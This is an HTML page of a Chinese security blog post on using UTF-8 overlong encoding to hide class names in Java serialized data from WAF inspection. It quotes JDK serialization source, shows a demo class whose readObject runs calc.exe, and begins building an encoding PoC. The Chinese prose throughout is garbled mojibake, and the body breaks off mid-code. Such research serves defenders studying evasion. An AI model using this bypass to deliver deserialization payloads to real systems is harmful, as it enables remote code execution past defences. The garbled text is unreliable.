<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>UTF-8 Overlong Encoding-Javaååºåˆ—åŒ– | Jiecub3</title>
<meta name="keywords" content="word 1, word 2">
<meta name="description" content="0x01 å‰è¨€ Javaååºåˆ—åŒ–ä¸­åº”ç”¨ @1ue UTF-8 Overlong EncodingåŸç† @pç‰› æ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡ŒUTF-">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–" />
<meta property="og:description" content="0x01 å‰è¨€ Javaååºåˆ—åŒ–ä¸­åº”ç”¨ @1ue UTF-8 Overlong EncodingåŸç† @pç‰› æ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡ŒUTF-" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-12-12T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-12-12T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–"/>
<meta name="twitter:description" content="0x01 å‰è¨€ Javaååºåˆ—åŒ–ä¸­åº”ç”¨ @1ue UTF-8 Overlong EncodingåŸç† @pç‰› æ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡ŒUTF-"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–",
      "item": "https://Jiecub3.github.io/zh/posts/java/bypass_waf/utf-8-overlong-encoding-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–",
  "name": "UTF-8 Overlong Encoding-Javaååºåˆ—åŒ–",
  "description": "0x01 å‰è¨€ Javaååºåˆ—åŒ–ä¸­åº”ç”¨ @1ue UTF-8 Overlong EncodingåŸç† @pç‰› æ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡ŒUTF-",
  "keywords": [
    "word 1", "word 2"
  ],
  "articleBody": "0x01 å‰è¨€ Javaååºåˆ—åŒ–ä¸­åº”ç”¨ @1ue\nUTF-8 Overlong EncodingåŸç† @pç‰›\næ‹œè¯»ä¸Šé¢ä¸¤ç¯‡æ–‡ç« åï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè·Ÿç€1ueå¸ˆå‚…çš„æ–‡ç« å†åˆ†æäº†ä¸‹ï¼Œè¿™é‡ŒUTF-8 Overlong Encodingåœ¨javaä¸­è§£å†³äº†æµé‡çš„ç›‘æµ‹çš„ç»•è¿‡ï¼Œè®©æ˜æ–‡ç±»ååœ¨æµé‡ä¸Šä¸å†æ˜¯asciiä¸­çš„å­—ç¬¦ï¼Œä½†æ˜¯ååºåˆ—åŒ–åˆèƒ½è§£ææˆæ­£å¸¸æ•°æ®ï¼Œç»•è¿‡wafæ‹¦æˆªï¼Œä½†æ˜¯åˆ†æå®Œå‘ç°åŠ å¯†å¯¹åº”çš„å€¼æ˜¯å›ºå®šçš„ï¼Œä¸è¿‡å¯ä»¥2ï¼Œ3byteäº¤å‰æ··æ´—ã€‚\nä¸‹æ–‡å¯¹utf-8åœ¨ååºåˆ—åŒ–ä¸­çš„åŸç†è¿›è¡Œäº†è§£æï¼Œç„¶åæ„é€ pocå¹¶æ”¹è¿›pocï¼Œå®ç°å…¨å­—æ®µåŠ å¯†\n0x02 UTF-8 Overlong EncodingåŸç† è¿™é‡Œå¤§æ¦‚è§£é‡Šä¸‹åŸç†ï¼Œå…·ä½“ä¹Ÿå¯ä»¥çœ‹pç‰›æ–‡ç« \nutf-8ç¼–ç  å‚è€ƒè¿™ä¸ªè¡¨æ ¼ï¼Œç”¨äºå°†unicodeç è½¬æ¢æˆUTF-8ç¼–ç ï¼š\nFirst code point Last code point Byte 1 Byte 2 Byte 3 Byte 4 U+0000 U+007F 0xxxxxxx U+0080 U+07FF 110xxxxx 10xxxxxx U+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx U+10000 U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx åŠå½“å­—ç¬¦uincodeç¼–ç è¶…è¿‡U+007Fæ—¶ï¼ŒUTF-8ä¼šç”¨å¤šä¸ªByteæ¥ä»£è¡¨è¿™ä¸ªå­—ç¬¦(U+0080-U+07FFè¿™ä¸ªèŒƒå›´å°±2ä¸ªByteï¼Œå…¶ä»–èŒƒå›´è§ä¸Šè¡¨)\nè¿™ç§æ–¹å¼çœ‹ä¼¼ä¹Ÿæ²¡æ¯›ç—…ï¼Œä½†æ˜¯å½“æˆ‘ä»¬æŠŠæœ¬èº«æ˜¯1Byteå­—ç¬¦ï¼ŒæŒ‰ç…§2Byteçš„æ ¼å¼ï¼ˆä¸Šå›¾ï¼‰æ„é€ ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢\nPç‰›ç”¨ç‚¹å·.ä¸¾äº†ä¸ªä¾‹å­ï¼Œå…¶unicodeç¼–ç å’Œasciiç¼–ç ä¸€è‡´ï¼Œå‡ä¸º0x2Eã€‚æŒ‰ç…§ä¸Šè¡¨ï¼Œå®ƒåªèƒ½è¢«ç¼–ç æˆå•å­—èŠ‚çš„UTF-8å­—ç¬¦ï¼Œä½†æˆ‘æŒ‰ç…§ä¸‹é¢çš„æ–¹æ³•è¿›è¡Œè½¬æ¢ï¼š\n0x2Eçš„äºŒè¿›åˆ¶æ˜¯10 1110ï¼Œæˆ‘ç»™å…¶å‰é¢è¡¥5ä¸ª0ï¼Œå˜æˆ00000101110 å°†å…¶åˆ†æˆ5ä½ã€6ä½ä¸¤ç»„ï¼š00000ï¼Œ101110 åˆ†åˆ«ç»™è¿™ä¸¤ç»„å¢åŠ å‰ç¼€110ï¼Œ10ï¼Œç»“æœæ˜¯11000000ï¼Œ10101110ï¼Œå¯¹åº”çš„æ˜¯\\xC0\\xAE 0xC0AEå¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8å­—ç¬¦ï¼Œä½†æˆ‘ä»¬ç¡®å®æ˜¯æŒ‰ç…§UTF-8ç¼–ç æ–¹å¼å°†å…¶è½¬æ¢å‡ºæ¥çš„ï¼Œè¿™å°±æ˜¯UTF-8è®¾è®¡ä¸­çš„ä¸€ä¸ªç¼ºé™·ã€‚\nè¿™ä¸ªé—®é¢˜åœ¨pythonä¸­å·²ç»ä¿®å¤è¿‡äº†ï¼Œä½†æ˜¯javaä»»ç„¶å­˜åœ¨ï¼ˆæˆ‘è§‰å¾—javaå¯ä»¥utf-8è½¬åŒ–åå†è¿›è¡Œä¸€æ¬¡èŒƒå›´åˆ¤æ–­ï¼Œ1byteæ˜¯å°äº127çš„ï¼‰\né‚£æˆ‘ä»¬è¿›å…¥æ­£é¢˜ï¼Œçœ‹çœ‹UTF-8 Overlong Encodingåœ¨javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨ï¼Œååºåˆ—åŒ–å­˜åœ¨è¿™ä¸ªé—®é¢˜æ˜¯å› ä¸ºååºåˆ—åŒ–å’Œååºåˆ—åŒ–å°†å­—ç¬¦è½¬æ¢çš„æ–¹å¼æ­£æ˜¯ä¸Šé¢utf-8åˆ°uincodeè¿™ç§æ¨¡å¼è¿›è¡Œè½¬æ¢çš„ã€‚\n0x03 readObject UTF-8 è¿™é‡Œå¯ä»¥è·Ÿç€1ueå¸ˆå‚…æ–‡ç« çœ‹\ndemoæ–¹ä¾¿è°ƒè¯•\npackage UTF8; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class evil implements Serializable { private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (IOException e) { e.printStackTrace(); } } } å¼€å§‹debugï¼Œè§‚æµ‹readObjectæ˜¯ä½•æ—¶æ‹¿å–classNameçš„\nè¿™é‡Œ1ueå¸ˆå‚…ç»™å‡ºäº†è°ƒç”¨é“¾\nObjectStreamClass#readNonProxy(ObjectInputStream in) ObjectInputStream#readUTF() BlockDataInputStream#readUTF() ObjectInputStream#readUTFBody(long utflen) ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen) å…³é”®ç‚¹å°±åœ¨readUTFSpan()ï¼Œååºåˆ—åŒ–evilç±»ï¼Œæ‰“ä¸ªæ–­ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹è¿™ä¸ªå‡½æ•°å¹²äº†å•¥\nutflenæ˜¯è·å–çš„ç±»åçš„é•¿åº¦ï¼Œç„¶åwhileæ‰§è¡Œstop-pos(ä¸€èˆ¬å°±æ˜¯utflen)æ¬¡ï¼Œæ¥è§£æç±»åçš„æ¯ä¸ªå­—ç¬¦å­˜å‚¨åˆ°cbufï¼Œæœ€åå†æ·»åŠ åˆ°sbufï¼Œé—®é¢˜å°±åœ¨è§£ææ¯ä¸ªå­—èŠ‚çš„æ—¶å€™\nä»æ³¨é‡Šèƒ½ä¸€çœ¼å‘ç°ï¼Œæ˜¯å­˜åœ¨UTF-8ç¼–ç è§„åˆ™çš„é—®é¢˜ï¼Œä¸‹æ–‡ç»“åˆå›¾ç‰‡åˆ†æé—®é¢˜\nprivate long readUTFSpan(StringBuilder sbuf, long utflen) throws IOException { int cpos = 0; int start = pos; int avail = Math.min(end - pos, CHAR_BUF_SIZE); // stop short of last char unless all of utf bytes in buffer int stop = pos + ((utflen \u003e avail) ? avail - 2 : (int) utflen); boolean outOfBounds = false; try { while (pos \u003c stop) { int b1, b2, b3; b1 = buf[pos++] \u0026 0xFF; switch (b1 \u003e\u003e 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; case 12: case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 \u0026 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026 0x1F) \u003c\u003c 6) | ((b2 \u0026 0x3F) \u003c\u003c 0)); break; case 14: // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx b3 = buf[pos + 1]; b2 = buf[pos + 0]; pos += 2; if ((b2 \u0026 0xC0) != 0x80 || (b3 \u0026 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026 0x0F) \u003c\u003c 12) | ((b2 \u0026 0x3F) \u003c\u003c 6) | ((b3 \u0026 0x3F) \u003c\u003c 0)); break; default: // 10xx xxxx, 1111 xxxx throw new UTFDataFormatException(); } } } catch (ArrayIndexOutOfBoundsException ex) { outOfBounds = true; } finally { if (outOfBounds || (pos - start) \u003e utflen) { /* * Fix for 4450867: if a malformed utf char causes the * conversion loop to scan past the expected end of the utf * string, only consume the expected number of utf bytes. */ pos = start + (int) utflen; throw new UTFDataFormatException(); } } sbuf.append(cbuf, 0, cpos); return pos - start; } è¿™é‡Œçœ‹åˆ°ä¸‹å›¾ï¼Œæ¯æ¬¡whileä¼šä»bufæ•°æ®æµé‡Œå–ä¸€ä¸ªå­—ç¬¦å’Œ0xFFåš\u0026è¿ç®—ï¼Œç„¶åb1å³ç§»åŠ¨4ä½ï¼Œå°±æ˜¯b1å»æ‰å³è¾¹å4ä½å‰©ä¸‹çš„äºŒè¿›åˆ¶çš„10è¿›åˆ¶åœ¨0-7çš„èŒƒå›´å°±æ˜¯å±äº1byteçš„ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªèŒƒå›´å‘¢10000000æ˜¯128ï¼Œ0xxxxxxxåˆšå¥½å°±æ˜¯(0-127),ç†Ÿæ‚‰asciiå°±çŸ¥é“è¿™ä¸ªèŒƒå›´åŒ…å«æ­£å¸¸å¯æ‰“å°å­—ç¬¦èŒƒå›´(32-126)\nè¿™é‡Œè¿˜æ˜¯ä¸¾ä¸ªä¾‹å­å§ eg:\n'a'çš„äºŒè¿›åˆ¶æ˜¯01100001ï¼Œç»è¿‡\u003e\u003e4è¿ç®—åä¸º0110ï¼Œ10è¿›åˆ¶æ˜¯6ä¼šè¿›å…¥case 6:ä¹Ÿå°±æ˜¯1byte\nè¿™é‡Œå¾ˆå®¹æ˜“å‘ç°2byteå¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œæˆ‘å…ˆä¸è®²è¿™ä¸ªï¼Œè¿™é‡Œæˆ‘å…ˆæƒ³åˆ°çš„æ˜¯æ²¡æœ‰case8:å•Šï¼ï¼ï¼é‚£ascii 128æ€ä¹ˆåŠ\n128 æ¬§å…ƒç¬¦å· 128æ­£å¼æˆ‘ä»¬çš„æ¬§å…ƒç¬¦å·â‚¬ï¼Œè¿™é‡Œæ–¹ä¾¿åˆ†ææˆ‘ç›´æ¥æ”¹äº†evilç±»åï¼Œå‘ç°æ˜¯å¯ä»¥ç”¨çš„\nç”Ÿæˆçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°â‚¬åœ¨javaä¸­å…¶å®å¯¹åº”3byteï¼Œå› ä¸ºä»–çš„uincodeç¼–ç æ˜¯U+20ACï¼Œè¿™é‡ŒæŒ‰ç…§ä¸Šé¢è½¬æ¢è¡¨ï¼Œè¿™é‡Œçªç„¶åŠ æ·±äº†å¯¹è¡¨ä¸­xxxçš„ç†è§£\nè¿™é‡Œxxxä¸€å…±16ä½ï¼Œ20ACçš„äºŒè¿›åˆ¶ä¹Ÿæ˜¯16ä½ï¼Œç„¶åå¡«å…¥åç”Ÿæˆçš„3byteå°±æ˜¯ä»–çš„utf-8ï¼Œï¼ˆhhhä¹‹å‰æ²¡æ³¨æ„è¿™ä¸ªï¼Œåˆšåˆšæƒ³16ä½æ€ä¹ˆ24ä½çš„æ—¶å€™çœ‹åˆ°è¿™ä¸ªæç„¶å¤§æ‚Ÿhhh\nU+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx\n20ACçš„äºŒè¿›åˆ¶0010000010101100 â€“\u003e utf-8: 11100010 10000010 10101100\nåŠE282ACå¯¹åº”ç€åºåˆ—åŒ–ç”Ÿæˆçš„å†…å®¹ï¼Œè¯´æ˜æ²¡é”™ï¼Œæ‰€ä»¥ä¸èƒ½æŒ‰ç…§asciiç çš„æ€ç»´å»æƒ³utf-8ç¼–ç ï¼Œååºåˆ—åŒ–ä¸­æ˜¯æŒ‰ç…§uincodeè½¬åŒ–ä¸ºutf-8\næ—¢ç„¶éƒ½åˆ°è¿™äº†ï¼Œå°±ç®€å•åˆ†æä¸‹ï¼Œ3byteä»–æ˜¯æ€ä¹ˆè½¬åŒ–çš„å§\n3byte è¿™é‡Œå¯¹åº”çš„æ˜¯-30ï¼Œ-126ï¼Œ-84è¿™é‡Œå­˜å‚¨éƒ½æ˜¯è¡¥ç ï¼ŒåŠæœ€é«˜ä½ä½1æ—¶ï¼Œè¡¥ç å’ŒåŸç ä¸åŒï¼Œè¿™é‡Œè¿™ä¸‰æœ€é«˜ä½éƒ½æ˜¯1ï¼Œæ‰€ä»¥è¿™é‡Œè¡¥ç æ˜¾ç¤ºå‡ºæ¥éƒ½æ˜¯è´Ÿæ•°å’ŒåŸç ä¸åŒ\nè¿™é‡Œå°±æ˜¯ç®€å•åˆ†æä¸‹ä»£ç é€»è¾‘ï¼Œè¿™é‡Œè¯†åˆ«åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯1110å¼€å¤´å=case14:,ç„¶åè¿™é‡Œb3å’Œb2ä¼šè·å–åä¸¤ä½byteï¼Œè¿™é‡Œpos+0æ˜¯å› ä¸ºå‰é¢è·å–b1æ—¶b1 = buf[pos++] \u0026 0xFF;ï¼Œposç”¨çš„å++æ‰€ä»¥poså®šä½ç¬¦å·²ç»å‘åäº†ä¸€ä½\nif ((b2 \u0026 0xC0) != 0x80 || (b3 \u0026 0xC0) != 0x80) { è¿™ä¸ªæ˜¯æ£€æµ‹ b2 b3æ˜¯ä¸æ˜¯ä»¥10xx xxxxçš„æ ¼å¼ï¼ŒC0æ˜¯1100 0000ï¼Œè·Ÿä»–åš\u0026åªæœ‰10xx xxxxçš„æ ¼å¼æ‰ä¼š==0x80\n(char) (((b1 \u0026 0x0F) \u003c\u003c 12) |((b2 \u0026 0x3F) \u003c\u003c 6) |((b3 \u0026 0x3F) \u003c\u003c 0)) ç„¶åçœ‹åˆ°è¿™ä¸€æ®µï¼Œå…¶å®å°±æ˜¯æ¢å¤â‚¬çš„uincodeç¼–ç çš„äºŒè¿›åˆ¶ï¼Œè¿™é‡Œæƒ³æˆäºŒè¿›åˆ¶å°±å¾ˆå¥½ç†è§£äº†\nè¿™é‡Œb1 \u0026 0000 1111 å¾—åˆ°å°±æ˜¯0000 0010ç„¶åå‘å·¦ç§»åŠ¨12ä½ 0010 0000 0000 0000 è¿™ä¸æ˜¯å°±uincodeç¼–ç äºŒè¿›åˆ¶å‰4ä½ä¹ˆï¼Œç„¶åæœ€åè¿›è¡Œorè¿ç®—ï¼Œä¸å°±æ˜¯å¾—åˆ°å®Œæ•´çš„uincodeç¼–ç çš„äºŒè¿›åˆ¶ä¹ˆï¼Œç„¶å10è¿›åˆ¶æ˜¯8364å†charè½¬æ¢æˆå­—ç¬¦\nreal 128 ä½†æ˜¯æˆ‘ä»¬æ„è¯†åˆ°â‚¬åªæ˜¯asciiä¸­çš„128ï¼Œå¹¶ä¸æ˜¯uincodeä¸­çš„128ï¼ŒåŠu+0080ï¼Œè·Ÿæˆ‘ä»¬æƒ³è¦åˆ†æçš„ä¸œè¥¿è²Œä¼¼æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹çœ‹å¦‚æœæ˜¯128ï¼Œjavaæ˜¯æ€ä¹ˆç”Ÿæˆçš„\næ ¹æ®getUTFLength()ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“128æ˜¯ä¼šèµ°åˆ°2byteçš„\nè¿™é‡Œå‘ç°ä¼šç”Ÿæˆä¸¤ä¸ªbyte 194 å’Œ 130 11000010 10000010éƒ½æ˜¯ç¬¦åˆè½¬ç è§„åˆ™çš„ï¼Œå¹¶ä¸ä¼šå‡ºç°æˆ‘ä»¬æƒ³è±¡ä¸­utf-8 128å»è½¬uincodeæ²¡å¯¹åº”case8ï¼šçš„æƒ…å†µï¼Œå› ä¸ºå­˜å‚¨ä¸ºutf-8ç¼–ç çš„æ—¶å€™æ ¹æœ¬ä¸æ˜¯128ï¼Œæƒ³å¤šäº†hhhï¼ˆ128utf-8æœ¬èº«å°±ä¸åˆæ³•ï¼‰\n0x04 å¼€å§‹æ„é€  2byteä»£ç é€»è¾‘å…¶å®éƒ½ä¸ç”¨çœ‹äº†ï¼Œè·Ÿ3byteå·®ä¸äº†å¤šå°‘ï¼Œå°±æ˜¯è®©xxxé‡Œé¢çš„ä¸œè¥¿å’Œæˆ‘ä»¬è¦æ„é€ çš„äºŒè¿›åˆ¶ä¸€æ ·å°±è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸€èˆ¬æ„é€ çš„éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œä¸€èˆ¬åªæœ‰8ä½2è¿›åˆ¶ï¼Œè¿™é‡Œxxxæœ‰11ä½ï¼Œç®€å•å‰é¢å¡«0å°±å¥½\nè¿™ä¸ªæ‹¿Uå®éªŒï¼ŒäºŒè¿›åˆ¶æ˜¯0101 0101 å¡«3ä¸ª0 000 0101 0101ï¼Œç„¶åæŒ‰ç…§2byteæ ¼å¼å¾—åˆ° 11000001 10010101 åŠã€0xC195\næˆ‘ä»¬å°†Uæ›¿æ¢æˆ2byteï¼Œçœ‹åˆ°ä¸‹å›¾æˆåŠŸå®ç°\nä½†æ˜¯læ²¡åŠ è½½å‡ºæ¥å› ä¸º2byteè¦å ç”¨ä¸¤ä¸ªé•¿åº¦ï¼Œè€Œutflenè¿˜æ˜¯åŸæ¥çš„é•¿åº¦ï¼Œæ‰€ä»¥è®©å…¶+1å°±å¥½\nå…¶å®ä¸éš¾æƒ³åˆ°æ—¢ç„¶ååºåˆ—åŒ–æ˜¯å°†utf-8è½¬åŒ–æˆuincodeï¼Œé‚£åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†uincodeè½¬åŒ–æˆutf-8ç¼–ç å­˜å‚¨çš„\nwriteUTF æˆ‘ä»¬ç®€å•è°ƒè¯•ä¸‹å°±èƒ½å‘ç°writeUTFè¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥è½¬åŒ–ç¼–ç å­˜å‚¨çš„\npublic void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u003e 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } è¿™é‡Œæˆ‘æƒ³æ„é€ çš„æ˜¯2byteçš„æ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œif (utflen == (long) s.length()) {è‚¯å®šæ˜¯falseï¼Œè¿›å…¥writeUTFBody\nprivate void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (pos \u003c= limit) { if (c \u003c= 0x007F \u0026\u0026 c != 0) { buf[pos++] = (byte) c; } else if (c \u003e 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); pos += 3; } else { buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u003c= 0x007F \u0026\u0026 c != 0) { write(c); } else if (c \u003e 0x07FF) { write(0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); write(0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } else { write(0xC0 | ((c \u003e\u003e 6) \u0026 0x1F)); write(0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); } } } off += csize; } } åœ¨è¿™é‡Œä»£ç æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å‘ç°æ˜¯å°†uincodeç¼–ç è½¬åŒ–æˆutf-8ç¼–ç çš„æ ¼å¼ï¼Œåªæ˜¯æœ‰èŒƒå›´åˆ¤å®šï¼Œæˆ‘å½“æ—¶ç¬¬ä¸€ååº”å°±æ˜¯é‡å†™è¿™ä¸ªæ–¹æ³•ï¼ŒæŠŠè¿™ä¸ªèŒƒå›´æ”¹äº†ï¼Œä¸å°±èƒ½è®©javaå¸®æˆ‘ä»¬2byteç¼–ç äº†ä¹ˆhh\nè¿˜æœ‰ä¸ªç‚¹å°±æ˜¯é•¿åº¦ é€šè¿‡getUTFLength()è¿”å›ï¼Œä¹Ÿè·ŸèŒƒå›´æœ‰å…³ï¼Œé‚£æŠŠè¿™ä¸ªä¹Ÿé‡å†™ä¸å°±è¡Œå•¦hh\nlong getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u003c len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u003c csize; cpos++) { char c = cbuf[cpos]; if (c \u003e= 0x0001 \u0026\u0026 c \u003c= 0x007F) { utflen++; } else if (c \u003e 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } pocæ„é€  å…¶å®æˆ‘ä»¬æœ€å¤§çš„é—®é¢˜å°±æ˜¯ä¸èƒ½ç›´æ¥é‡å†™writeUTFBodyæ–¹æ³•ï¼ˆè¿™é‡Œçš„æ—¶å€™è¿˜ä¸ä¼šagentï¼_!ï¼‰ï¼Œå› ä¸ºä»–æ˜¯privateä¸”æ˜¯ObjectOutputStreamçš„å­ç±»\næˆ‘ä»¬çœ‹åˆ°writeUTFBody ifä¼šåˆ¤æ–­èŒƒå›´ç„¶åè¿›è¡Œå¯¹åº”byteçš„ç¼–ç ï¼Œç„¶åæ³¨æ„ä¸‹è¿™é‡Œæ•°æ®å°‘ï¼ˆ\u003c1024ï¼‰çš„æ—¶å€™ä¸ä¼šæ‰§è¡Œä¸‹æ–¹elseä¸­write()æ–¹æ³•ï¼Œå“ªé‡Œä¼šè¿›è¡Œå†™å…¥å‘¢ï¼Œæˆ‘ä»¬æ ¹æ®è°ƒç”¨æ ˆå¾€ä¸ŠæŸ¥æ‰¾\nè§ä¸‹å›¾ï¼ŒwriteClassDescriptor(desc);å°±æ˜¯ä¸Šé¢æ‰§è¡Œå†™å…¥bufçš„æ“ä½œã€‚è€Œbout.setBlockDataMode(true);é‡Œçš„drain()å‡½æ•°æ‰æ˜¯çœŸæ­£å†™å…¥æ•°æ®çš„æ—¶å€™\ndrain() void drain() throws IOException { if (pos == 0) { return; } if (blkmode) { writeBlockHeader(pos); } out.write(buf, 0, pos); pos = 0; } è¿™é‡Œout.writeæ‰æ˜¯çœŸæ­£è¿›è¡Œå†™å…¥æ“ä½œçš„åœ°æ–¹ã€‚\nbuf è¿˜è®°å¾—æˆ‘ä»¬çš„é—®é¢˜ä¹ˆï¼Œä¸èƒ½ç›´æ¥é‡å†™writeUTFBodyæ–¹æ³•ï¼Œé‚£èƒ½ä¸èƒ½è®¾ç½®è¿™ä¸ªbufå€¼å‘¢ï¼Ÿ\nåå°„ï¼Ÿå…¶å®ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬è¦åœ¨æ‰§è¡Œdrain()å‰ä¸€åˆ»è¦†ç›–è¿™ä¸ªå€¼ï¼Œè¿‡æ—©ä¼šè¢«writeUTFBodyä¼šè¢«è¦†ç›–ï¼Œè¿‡æ™šä¹Ÿä¸è¡Œã€‚\nä½†æ˜¯å¤©æ— ç»äººä¹‹è·¯ï¼ï¼æˆ‘ä»¬å›æƒ³åˆ°writeUTFBodyä¸­ä¸‹é¢ä¸€ä¸ªelseé‡Œä¸æ˜¯æœ‰writeæ“ä½œä¹ˆï¼Ÿè¿™ä¸ªæ˜¯ä»€ä¹ˆé€»è¾‘å‘¢\nif (pos \u003c= limit) { if (c \u003c= 0x007F \u0026\u0026 c != 0) { buf[pos++] = (byte) c; } else if (c \u003e 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u003e\u003e 0) \u0026 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u003e\u003e 6) \u0026 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u003e\u003e 12) \u0026 0x0F)); pos += 3; 